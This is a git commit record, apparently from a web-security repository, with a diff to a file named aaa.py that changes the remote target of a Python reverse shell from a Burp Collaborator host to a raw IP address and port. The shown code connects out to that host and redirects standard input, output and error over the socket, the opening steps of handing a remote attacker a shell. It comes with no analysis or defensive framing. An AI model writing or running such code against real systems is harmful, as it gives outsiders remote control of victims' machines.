a1ec336a57b80fb244f2ce12b88ce2053898373b
web安全 <178897973@qq.com>
2019-06-06 17:26:46 +0800

    Update aaa.py

--- aaa.py
+++ aaa.py
@@ -1,6 +1,6 @@
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("p6wgi3rafz9jzvkjxvaxir318sej28.burpcollaborator.net",80))
+s.connect(("139.196.121.189",2333))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
